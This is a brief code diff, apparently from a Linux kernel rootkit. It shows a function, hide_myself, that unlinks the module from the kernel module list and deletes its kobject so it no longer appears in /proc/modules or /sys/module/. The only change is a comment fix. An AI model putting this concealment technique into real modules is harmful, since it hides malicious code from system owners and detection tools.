@@ -571,7 +571,7 @@ static void hide_myself(void)
 
     // 摘除链表，/proc/modules 中不可见。
     list_del_init(&THIS_MODULE->list);
-    // 摘除kobj，/sys/modules/中不可见。
+    // 摘除kobj，/sys/module/中不可见。
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
     /*
